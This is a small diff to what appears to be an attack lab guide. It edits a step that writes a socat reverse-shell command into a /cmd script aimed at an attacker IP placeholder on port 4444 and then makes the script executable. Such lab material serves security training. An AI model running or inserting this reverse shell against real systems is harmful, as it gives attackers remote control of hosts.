@@ -151,7 +151,7 @@ Create the command, which will run socat and create a remote shell to the second
 
 ```
 echo '#!/bin/bash' > /cmd
-echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${vminfo:attacker02:public_ip}:4444" >> /cmd
+echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ATTACKER_PUPLIC_IP}:4444" >> /cmd
 chmod a+x /cmd
 ```
 
